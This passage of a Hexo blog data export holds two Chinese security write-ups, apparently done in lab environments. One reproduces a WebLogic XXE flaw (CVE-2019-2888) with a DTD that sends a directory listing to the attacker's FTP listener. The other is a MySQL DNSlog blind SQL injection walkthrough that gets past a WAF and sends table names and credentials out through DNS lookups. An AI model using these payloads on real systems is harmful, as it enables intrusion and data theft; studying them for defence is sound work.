timeline\n---\n","updated":"2021-08-05T07:58:59.385Z","path":"timeline/index.html","comments":1,"layout":"page","_id":"ckt46mpf3000avkq3bshwc6rx","content":"","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"cover":"/img/12.jpeg","excerpt":"","more":""},{"title":"messageboard","date":"2021-08-05T07:57:29.000Z","type":"messageboard","_content":"","source":"messageboard/index.md","raw":"---\ntitle: messageboard\ndate: 2021-08-05 15:57:29\ntype: messageboard\n---\n","updated":"2021-08-05T07:58:07.485Z","path":"messageboard/index.html","comments":1,"layout":"page","_id":"ckt46mpf5000evkq3894s19ha","content":"","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"cover":"/img/12.jpeg","excerpt":"","more":""}],"Post":[{"title":"(CVE-2019-2888)weblogic-XXE漏洞复现","keywords":"XXE,weblogic,漏洞复现,CVE-2019-2888","description":"(CVE-2019-2888)weblogic-XXE漏洞复现","cover":"/images/17/3.png","date":"2020-10-02T02:45:41.000Z","type":"categories","_content":"\n\n\n本篇文章将带来weblogic的xxe漏洞CVE-2019-2888的漏洞利用方式\t\n环境搭建请参考这一篇文章\n\nhttps://j-jasson2.github.io/2020/09/30/Windows搭建weblogic环境/\n\n# 漏洞检测\n## 黑盒审计\n1、端口+服务+版本\n![upload successful](/images/17/1.png) \n![upload successful](/images/17/2.png) \n![upload successful](/images/17/3.png) \n![upload successful](/images/17/4.png) \n\n2、首先使用在线工具获取一个dnslog地址\n![upload successful](/images/17/5.png) \n\n3、使用CVE-2019-2888调用外部的我们获取的dnslog地址\n![upload successful](/images/17/6.png) \n\n4、回去查看日志，已经成功获取了日志，说明这里可能存在CVE-2019-2888漏洞\n![upload successful](/images/17/7.png) \n\n## 白盒审计\n在源码中的\n\\weblogic\\servlet\\ejb2jsp\\dd\\EJBTaglibDescriptor.class这个类继承自java\\io\\Externalizable\n如果没有对该类进行**disableXXEOnDocumentBuilderFactory**处理，即存在CVE-2019-2888 漏洞。\n![upload successful](/images/17/8.png) \n\n# 漏洞复现\n工具：\t\nxxer：\t\nhttps://github.com/TheTwitchy/xxer\t\nCVE-2019-2888\t\nhttps://github.com/jas502n/CVE-2019-2888\n\n1、首先攻击机下载好工具，打开xxer，开始监听数据\n```\npython xxer.py -p 8989 -H 192.168.159.129\n```\n![upload successful](/images/17/9.png)\n\n2、打开xxer文件目录下的ext.dtd，输入以下内容，需要修改的地方为读取靶机的内容的路径以及攻击机的ip。\n```\n<!ENTITY % bbb SYSTEM \"file:///Windows/\"><!ENTITY % ccc \"<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@192.168.159.129:2121/b'>\">\n```\n![upload successful](/images/17/10.png)\n\n3、新打开一个终端，路径为CVE-2019-2888的文件夹中。运行命令，会让你输入攻击机的IP与端口，我这里分别是192.168.159.129和8989\n![upload successful](/images/17/11.png)  \n\n4、回到之前xxer的监听界面，获取了靶机的/Windows路径下的所有文件信息\n![upload successful](/images/17/12.png) \n\n","source":"_posts/CVE-2019-2888-weblogic-XXE漏洞复现.md","raw":"---\ntitle: (CVE-2019-2888)weblogic-XXE漏洞复现\ntags: \n  - XXE\n  - weblogic\n  -\t漏洞复现\n  -\tCVE-2019-2888\ncategories: 漏洞复现\nkeywords: 'XXE,weblogic,漏洞复现,CVE-2019-2888'\ndescription: (CVE-2019-2888)weblogic-XXE漏洞复现\ncover: /images/17/3.png\ndate: 2020-10-02 10:45:41\ntype: categories\n---\n\n\n\n本篇文章将带来weblogic的xxe漏洞CVE-2019-2888的漏洞利用方式\t\n环境搭建请参考这一篇文章\n\nhttps://j-jasson2.github.io/2020/09/30/Windows搭建weblogic环境/\n\n# 漏洞检测\n## 黑盒审计\n1、端口+服务+版本\n![upload successful](/images/17/1.png) \n![upload successful](/images/17/2.png) \n![upload successful](/images/17/3.png) \n![upload successful](/images/17/4.png) \n\n2、首先使用在线工具获取一个dnslog地址\n![upload successful](/images/17/5.png) \n\n3、使用CVE-2019-2888调用外部的我们获取的dnslog地址\n![upload successful](/images/17/6.png) \n\n4、回去查看日志，已经成功获取了日志，说明这里可能存在CVE-2019-2888漏洞\n![upload successful](/images/17/7.png) \n\n## 白盒审计\n在源码中的\n\\weblogic\\servlet\\ejb2jsp\\dd\\EJBTaglibDescriptor.class这个类继承自java\\io\\Externalizable\n如果没有对该类进行**disableXXEOnDocumentBuilderFactory**处理，即存在CVE-2019-2888 漏洞。\n![upload successful](/images/17/8.png) \n\n# 漏洞复现\n工具：\t\nxxer：\t\nhttps://github.com/TheTwitchy/xxer\t\nCVE-2019-2888\t\nhttps://github.com/jas502n/CVE-2019-2888\n\n1、首先攻击机下载好工具，打开xxer，开始监听数据\n```\npython xxer.py -p 8989 -H 192.168.159.129\n```\n![upload successful](/images/17/9.png)\n\n2、打开xxer文件目录下的ext.dtd，输入以下内容，需要修改的地方为读取靶机的内容的路径以及攻击机的ip。\n```\n<!ENTITY % bbb SYSTEM \"file:///Windows/\"><!ENTITY % ccc \"<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@192.168.159.129:2121/b'>\">\n```\n![upload successful](/images/17/10.png)\n\n3、新打开一个终端，路径为CVE-2019-2888的文件夹中。运行命令，会让你输入攻击机的IP与端口，我这里分别是192.168.159.129和8989\n![upload successful](/images/17/11.png)  \n\n4、回到之前xxer的监听界面，获取了靶机的/Windows路径下的所有文件信息\n![upload successful](/images/17/12.png) \n\n","slug":"CVE-2019-2888-weblogic-XXE漏洞复现","published":1,"updated":"2021-08-07T16:21:47.089Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpet0001vkq39a8mef0p","content":"<p>本篇文章将带来weblogic的xxe漏洞CVE-2019-2888的漏洞利用方式<br>环境搭建请参考这一篇文章</p>\n<p><a href=\"https://j-jasson2.github.io/2020/09/30/Windows%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/\">https://j-jasson2.github.io/2020/09/30/Windows搭建weblogic环境/</a></p>\n<h1 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h1><h2 id=\"黑盒审计\"><a href=\"#黑盒审计\" class=\"headerlink\" title=\"黑盒审计\"></a>黑盒审计</h2><p>1、端口+服务+版本<br><img src=\"/images/17/1.png\" alt=\"upload successful\"><br><img src=\"/images/17/2.png\" alt=\"upload successful\"><br><img src=\"/images/17/3.png\" alt=\"upload successful\"><br><img src=\"/images/17/4.png\" alt=\"upload successful\"> </p>\n<p>2、首先使用在线工具获取一个dnslog地址<br><img src=\"/images/17/5.png\" alt=\"upload successful\"> </p>\n<p>3、使用CVE-2019-2888调用外部的我们获取的dnslog地址<br><img src=\"/images/17/6.png\" alt=\"upload successful\"> </p>\n<p>4、回去查看日志，已经成功获取了日志，说明这里可能存在CVE-2019-2888漏洞<br><img src=\"/images/17/7.png\" alt=\"upload successful\"> </p>\n<h2 id=\"白盒审计\"><a href=\"#白盒审计\" class=\"headerlink\" title=\"白盒审计\"></a>白盒审计</h2><p>在源码中的<br>\\weblogic\\servlet\\ejb2jsp\\dd\\EJBTaglibDescriptor.class这个类继承自java\\io\\Externalizable<br>如果没有对该类进行<strong>disableXXEOnDocumentBuilderFactory</strong>处理，即存在CVE-2019-2888 漏洞。<br><img src=\"/images/17/8.png\" alt=\"upload successful\"> </p>\n<h1 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h1><p>工具：<br>xxer：<br><a href=\"https://github.com/TheTwitchy/xxer\">https://github.com/TheTwitchy/xxer</a><br>CVE-2019-2888<br><a href=\"https://github.com/jas502n/CVE-2019-2888\">https://github.com/jas502n/CVE-2019-2888</a></p>\n<p>1、首先攻击机下载好工具，打开xxer，开始监听数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python xxer.py -p 8989 -H 192.168.159.129</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/17/9.png\" alt=\"upload successful\"></p>\n<p>2、打开xxer文件目录下的ext.dtd，输入以下内容，需要修改的地方为读取靶机的内容的路径以及攻击机的ip。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % bbb SYSTEM &quot;file:///Windows/&quot;&gt;&lt;!ENTITY % ccc &quot;&lt;!ENTITY &amp;#37; ddd SYSTEM &#x27;ftp://fakeuser:%bbb;@192.168.159.129:2121/b&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/17/10.png\" alt=\"upload successful\"></p>\n<p>3、新打开一个终端，路径为CVE-2019-2888的文件夹中。运行命令，会让你输入攻击机的IP与端口，我这里分别是192.168.159.129和8989<br><img src=\"/images/17/11.png\" alt=\"upload successful\">  </p>\n<p>4、回到之前xxer的监听界面，获取了靶机的/Windows路径下的所有文件信息<br><img src=\"/images/17/12.png\" alt=\"upload successful\"> </p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<p>本篇文章将带来weblogic的xxe漏洞CVE-2019-2888的漏洞利用方式<br>环境搭建请参考这一篇文章</p>\n<p><a href=\"https://j-jasson2.github.io/2020/09/30/Windows%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/\">https://j-jasson2.github.io/2020/09/30/Windows搭建weblogic环境/</a></p>\n<h1 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h1><h2 id=\"黑盒审计\"><a href=\"#黑盒审计\" class=\"headerlink\" title=\"黑盒审计\"></a>黑盒审计</h2><p>1、端口+服务+版本<br><img src=\"/images/17/1.png\" alt=\"upload successful\"><br><img src=\"/images/17/2.png\" alt=\"upload successful\"><br><img src=\"/images/17/3.png\" alt=\"upload successful\"><br><img src=\"/images/17/4.png\" alt=\"upload successful\"> </p>\n<p>2、首先使用在线工具获取一个dnslog地址<br><img src=\"/images/17/5.png\" alt=\"upload successful\"> </p>\n<p>3、使用CVE-2019-2888调用外部的我们获取的dnslog地址<br><img src=\"/images/17/6.png\" alt=\"upload successful\"> </p>\n<p>4、回去查看日志，已经成功获取了日志，说明这里可能存在CVE-2019-2888漏洞<br><img src=\"/images/17/7.png\" alt=\"upload successful\"> </p>\n<h2 id=\"白盒审计\"><a href=\"#白盒审计\" class=\"headerlink\" title=\"白盒审计\"></a>白盒审计</h2><p>在源码中的<br>\\weblogic\\servlet\\ejb2jsp\\dd\\EJBTaglibDescriptor.class这个类继承自java\\io\\Externalizable<br>如果没有对该类进行<strong>disableXXEOnDocumentBuilderFactory</strong>处理，即存在CVE-2019-2888 漏洞。<br><img src=\"/images/17/8.png\" alt=\"upload successful\"> </p>\n<h1 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h1><p>工具：<br>xxer：<br><a href=\"https://github.com/TheTwitchy/xxer\">https://github.com/TheTwitchy/xxer</a><br>CVE-2019-2888<br><a href=\"https://github.com/jas502n/CVE-2019-2888\">https://github.com/jas502n/CVE-2019-2888</a></p>\n<p>1、首先攻击机下载好工具，打开xxer，开始监听数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python xxer.py -p 8989 -H 192.168.159.129</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/17/9.png\" alt=\"upload successful\"></p>\n<p>2、打开xxer文件目录下的ext.dtd，输入以下内容，需要修改的地方为读取靶机的内容的路径以及攻击机的ip。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % bbb SYSTEM &quot;file:///Windows/&quot;&gt;&lt;!ENTITY % ccc &quot;&lt;!ENTITY &amp;#37; ddd SYSTEM &#x27;ftp://fakeuser:%bbb;@192.168.159.129:2121/b&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/17/10.png\" alt=\"upload successful\"></p>\n<p>3、新打开一个终端，路径为CVE-2019-2888的文件夹中。运行命令，会让你输入攻击机的IP与端口，我这里分别是192.168.159.129和8989<br><img src=\"/images/17/11.png\" alt=\"upload successful\">  </p>\n<p>4、回到之前xxer的监听界面，获取了靶机的/Windows路径下的所有文件信息<br><img src=\"/images/17/12.png\" alt=\"upload successful\"> </p>\n"},{"title":"MySQL数据库的dnslog注入","keywords":"MySQL,dnslog,sql注入","description":"MySQL数据库的dnslog注入","cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F20428239-e2a9abb837deef3e.png&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630915755&t=4e5de1dc3865a304f901e8b162c2a111","date":"2020-05-23T10:44:18.000Z","_content":"\nMySQL数据库作为使用数量最多的数据库，今天为大家带来一个dns注入教程，dns注入使用方法一般是在显错注入,报错注入都不能使用，盲注又太麻烦的情况下进行的，通过load_file()函数，解析dns的时候，将子查询的数据放入到dns日志中来获取数据。\n### 中华人民共和国网络安全法\n我们要做一名合法的白帽子！\n![upload successful](/images/pasted-41.png)\n\n![upload successful](/images/pasted-42.png)\n\n![upload successful](/images/pasted-43.png)\n\n### dns注入使用前提\n1.数据库为Mysql\t\t\n2.在mysql.ini配置文件里面需要有一句：secure_file_priv=\n3.注入需要使用load_file()函数，通过该函数可以读取本地文件里面的字符串内容，当然也可以访问UNC路径的内容。\n\n### Dnslog 注入具体流程\n1.首先打开靶场\n\n![upload successful](/images/pasted-78.png)\n\n2.通过源码发现，这里需要get传参一个id，尝试一下，页面没什么变化\n\n![upload successful](/images/pasted-79.png)\n\n3.那就常规思路进行尝试，先加个单引号，页面报错了，说明存在sql注入\n\n![upload successful](/images/pasted-80.png)\n\n4.闭合之后想要order by 猜当期字段数的，发现有安全狗\n\n![upload successful](/images/pasted-81.png)\n\n5.Apache中间件有一个特性，从右到左解析，遇到不认识的后缀就往前面解析，这里通过安全狗对后缀的局限性成功绕过（txt文件后缀传参不检测）\n\n![upload successful](/images/pasted-82.png)\n\n6.通过sleep()函数发现可以执行，页面延迟了，不需要单引号闭合\n\n![upload successful](/images/pasted-83.png)\n\n7.也就是这里可以通过延时盲注获取数据了，不过太麻烦了，我们使用新方法，通过dnslog获取数据库库名，首先申请一个域名\t\n(网址为http://dnslog.cn/\t，这里一般我们是需要有自己的dns服务器，然后让数据库访问我们的服务器进行dns解析的，但是搭建自己的服务器实在太麻烦了，于是就有先人搭建了服务器dnslog，我们可以先点击**Get SubDomain**申请一个域名，然后点击**Refresh Record**获取日志信息)\n\n![upload successful](/images/pasted-84.png)\n\n8.前面知道了函数load_file()，我们可以通过访问（子查询）+dns获取的域名+目录名，使得数据库访问网络路径并解析dns，将数据放到我们的dnslog中，这里我这样构造payload获取数据库库名。\n```\n?id=1 or load_file(concat('//',(select database()),'.e124fu.dnslog.cn/abc'))\n```\n\n![upload successful](/images/pasted-87.png)\n\n9.回到dnslog的页面访问日志看到库名为mangzhu\n\n![upload successful](/images/pasted-88.png)\n\n10.接下来就是替换子查询里面的内容获取其他数据了，这里我就获取数据库第一个表的表名为admin\n```\n?id=1 or load_file(concat('//',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.e124fu.dnslog.cn/abc'))\n```\n![upload successful](/images/pasted-89.png)\n\n11.第二个表名为news\n\n![upload successful](/images/pasted-90.png)\n\n12.接下来获取admin表的字段\n```\n?id=1 or load_file(concat('//',(select column_name from information_schema.columns where table_name='admin' limit 0,1),'.e124fu.dnslog.cn/abc'))\n```\n可以看到有username，password\n![upload successful](/images/pasted-91.png)\n\n13.一般我们就是获取里面的username和password字段的值\n```\nid=1 or load_file(concat('//',(select username from admin where Id=1),'.e124fu.dnslog.cn/abc'))\n```\n![upload successful](/images/pasted-92.png)\n\n14.第一个username值为flag，那就获取对应的第一个password的值，得到flag\n```\nid=1 or load_file(concat('//',(select password from admin where Id=1),'.e124fu.dnslog.cn/abc'))\n```\n![upload successful](/images/pasted-93.png)\n\n![upload successful](/images/pasted-94.png)\n\n15.提交flag，成功通关！\n\n![upload successful](/images/pasted-95.png)\n\n","source":"_posts/MySQL数据库的dnslog注入.md","raw":"---\ntitle: MySQL数据库的dnslog注入\ntags: \n  - sql注入\n  - 盲注\ncategories: web安全\nkeywords: 'MySQL,dnslog,sql注入'\ndescription: MySQL数据库的dnslog注入\ncover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F20428239-e2a9abb837deef3e.png&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630915755&t=4e5de1dc3865a304f901e8b162c2a111\ndate: 2020-05-23 18:44:18\n---\n\nMySQL数据库作为使用数量最多的数据库，今天为大家带来一个dns注入教程，dns注入使用方法一般是在显错注入,报错注入都不能使用，盲注又太麻烦的情况下进行的，通过load_file()函数，解析dns的时候，将子查询的数据放入到dns日志中来获取数据。\n### 中华人民共和国网络安全法\n我们要做一名合法的白帽子！\n![upload successful](/images/pasted-41.png)\n\n![upload successful](/images/pasted-42.png)\n\n![upload successful](/images/pasted-43.png)\n\n### dns注入使用前提\n1.数据库为Mysql\t\t\n2.在mysql.ini配置文件里面需要有一句：secure_file_priv=\n3.注入需要使用load_file()函数，通过该函数可以读取本地文件里面的字符串内容，当然也可以访问UNC路径的内容。\n\n### Dnslog 注入具体流程\n1.首先打开靶场\n\n![upload successful](/images/pasted-78.png)\n\n2.通过源码发现，这里需要get传参一个id，尝试一下，页面没什么变化\n\n![upload successful](/images/pasted-79.png)\n\n3.那就常规思路进行尝试，先加个单引号，页面报错了，说明存在sql注入\n\n![upload successful](/images/pasted-80.png)\n\n4.闭合之后想要order by 猜当期字段数的，发现有安全狗\n\n![upload successful](/images/pasted-81.png)\n\n5.Apache中间件有一个特性，从右到左解析，遇到不认识的后缀就往前面解析，这里通过安全狗对后缀的局限性成功绕过（txt文件后缀传参不检测）\n\n![upload successful](/images/pasted-82.png)\n\n6.通过sleep()函数发现可以执行，页面延迟了，不需要单引号闭合\n\n![upload successful](/images/pasted-83.png)\n\n7.也就是这里可以通过延时盲注获取数据了，不过太麻烦了，我们使用新方法，通过dnslog获取数据库库名，首先申请一个域名\t\n(网址为http://dnslog.cn/\t，这里一般我们是需要有自己的dns服务器，然后让数据库访问我们的服务器进行dns解析的，但是搭建自己的服务器实在太麻烦了，于是就有先人搭建了服务器dnslog，我们可以先点击**Get SubDomain**申请一个域名，然后点击**Refresh Record**获取日志信息)\n\n![upload successful](/images/pasted-84.png)\n\n8.前面知道了函数load_file()，我们可以通过访问（子查询）+dns获取的域名+目录名，使得数据库访问网络路径并解析dns，将数据放到我们的dnslog中，这里我这样构造payload获取数据库库名。\n```\n?id=1 or load_file(concat('//',(select database()),'.e124fu.dnslog.cn/abc'))\n```\n\n![upload successful](/images/pasted-87.png)\n\n9.回到dnslog的页面访问日志看到库名为mangzhu\n\n![upload successful](/images/pasted-88.png)\n\n10.接下来就是替换子查询里面的内容获取其他数据了，这里我就获取数据库第一个表的表名为admin\n```\n?id=1 or load_file(concat('//',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.e124fu.dnslog.cn/abc'))\n```\n![upload successful](/images/pasted-89.png)\n\n11.第二个表名为news\n\n![upload successful](/images/pasted-90.png)\n\n12.接下来获取admin表的字段\n```\n?id=1 or load_file(concat('//',(select column_name from information_schema.columns where table_name='admin' limit 0,1),'.e124fu.dnslog.cn/abc'))\n```\n可以看到有username，password\n![upload successful](/images/pasted-91.png)\n\n13.一般我们就是获取里面的username和password字段的值\n```\nid=1 or load_file(concat('//',(select username from admin where Id=1),'.e124fu.dnslog.cn/abc'))\n```\n![upload successful](/images/pasted-92.png)\n\n14.第一个username值为flag，那就获取对应的第一个password的值，得到flag\n```\nid=1 or load_file(concat('//',(select password from admin where Id=1),'.e124fu.dnslog.cn/abc'))\n```\n![upload successful](/images/pasted-93.png)\n\n![upload successful](/images/pasted-94.png)\n\n15.提交flag，成功通关！\n\n![upload successful](/images/pasted-95.png)\n\n","slug":"MySQL数据库的dnslog注入","published":1,"updated":"2021-08-07T16:19:51.006Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpex0003vkq3hpt0f48f","content":"<p>MySQL数据库作为使用数量最多的数据库，今天为大家带来一个dns注入教程，dns注入使用方法一般是在显错注入,报错注入都不能使用，盲注又太麻烦的情况下进行的，通过load_file()函数，解析dns的时候，将子查询的数据放入到dns日志中来获取数据。</p>\n<h3 id=\"中华人民共和国网络安全法\"><a href=\"#中华人民共和国网络安全法\" class=\"headerlink\" title=\"中华人民共和国网络安全法\"></a>中华人民共和国网络安全法</h3><p>我们要做一名合法的白帽子！<br><img src=\"/images/pasted-41.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-42.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-43.png\" alt=\"upload successful\"></p>\n<h3 id=\"dns注入使用前提\"><a href=\"#dns注入使用前提\" class=\"headerlink\" title=\"dns注入使用前提\"></a>dns注入使用前提</h3><p>1.数据库为Mysql<br>2.在mysql.ini配置文件里面需要有一句：secure_file_priv=<br>3.注入需要使用load_file()函数，通过该函数可以读取本地文件里面的字符串内容，当然也可以访问UNC路径的内容。</p>\n<h3 id=\"Dnslog-注入具体流程\"><a href=\"#Dnslog-注入具体流程\" class=\"headerlink\" title=\"Dnslog 注入具体流程\"></a>Dnslog 注入具体流程</h3><p>1.首先打开靶场</p>\n<p><img src=\"/images/pasted-78.png\" alt=\"upload successful\"></p>\n<p>2.通过源码发现，这里需要get传参一个id，尝试一下，页面没什么变化</p>\n<p><img src=\"/images/pasted-79.png\" alt=\"upload successful\"></p>\n<p>3.那就常规思路进行尝试，先加个单引号，页面报错了，说明存在sql注入</p>\n<p><img src=\"/images/pasted-80.png\" alt=\"upload successful\"></p>\n<p>4.闭合之后想要order by 猜当期字段数的，发现有安全狗</p>\n<p><img src=\"/images/pasted-81.png\" alt=\"upload successful\"></p>\n<p>5.Apache中间件有一个特性，从右到左解析，遇到不认识的后缀就往前面解析，这里通过安全狗对后缀的局限性成功绕过（txt文件后缀传参不检测）</p>\n<p><img src=\"/images/pasted-82.png\" alt=\"upload successful\"></p>\n<p>6.通过sleep()函数发现可以执行，页面延迟了，不需要单引号闭合</p>\n<p><img src=\"/images/pasted-83.png\" alt=\"upload successful\"></p>\n<p>7.也就是这里可以通过延时盲注获取数据了，不过太麻烦了，我们使用新方法，通过dnslog获取数据库库名，首先申请一个域名<br>(网址为<a href=\"http://dnslog.cn/\">http://dnslog.cn/</a>    ，这里一般我们是需要有自己的dns服务器，然后让数据库访问我们的服务器进行dns解析的，但是搭建自己的服务器实在太麻烦了，于是就有先人搭建了服务器dnslog，我们可以先点击<strong>Get SubDomain</strong>申请一个域名，然后点击<strong>Refresh Record</strong>获取日志信息)</p>\n<p><img src=\"/images/pasted-84.png\" alt=\"upload successful\"></p>\n<p>8.前面知道了函数load_file()，我们可以通过访问（子查询）+dns获取的域名+目录名，使得数据库访问网络路径并解析dns，将数据放到我们的dnslog中，这里我这样构造payload获取数据库库名。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 or load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.e124fu.dnslog.cn/abc&#x27;))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-87.png\" alt=\"upload successful\"></p>\n<p>9.回到dnslog的页面访问日志看到库名为mangzhu</p>\n<p><img src=\"/images/pasted-88.png\" alt=\"upload successful\"></p>\n<p>10.接下来就是替换子查询里面的内容获取其他数据了，这里我就获取数据库第一个表的表名为admin</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 or load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;.e124fu.dnslog.cn/abc&#x27;))</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-89.png\" alt=\"upload successful\"></p>\n<p>11.第二个表名为news</p>\n<p><img src=\"/images/pasted-90.png\" alt=\"upload successful\"></p>\n<p>12.接下来获取admin表的字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 or load_file(concat(&#x27;//&#x27;,(select column_name from information_schema.columns where table_name=&#x27;admin&#x27; limit 0,1),&#x27;.e124fu.dnslog.cn/abc&#x27;))</span><br></pre></td></tr></table></figure>\n<p>可以看到有username，password<br><img src=\"/images/pasted-91.png\" alt=\"upload successful\"></p>\n<p>13.一般我们就是获取里面的username和password字段的值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1 or load_file(concat(&#x27;//&#x27;,(select username from admin where Id=1),&#x27;.e124fu.dnslog.cn/abc&#x27;))</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-92.png\" alt=\"upload successful\"></p>\n<p>14.第一个username值为flag，那就获取对应的第一个password的值，得到flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1 or load_file(concat(&#x27;//&#x27;,(select password from admin where Id=1),&#x27;.e124fu.dnslog.cn/abc&#x27;))</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-93.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-94.png\" alt=\"upload successful\"></p>\n<p>15.提交flag，成功通关！</p>\n<p><img src=\"/images/pasted-95.png\" alt=\"upload successful\"></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<p>MySQL数据库作为使用数量最多的数据库，今天为大家带来一个dns注入教程，dns注入使用方法一般是在显错注入,报错注入都不能使用，盲注又太麻烦的情况下进行的，通过load_file()函数，解析dns的时候，将子查询的数据放入到dns日志中来获取数据。</p>\n<h3 id=\"中华人民共和国网络安全法\"><a 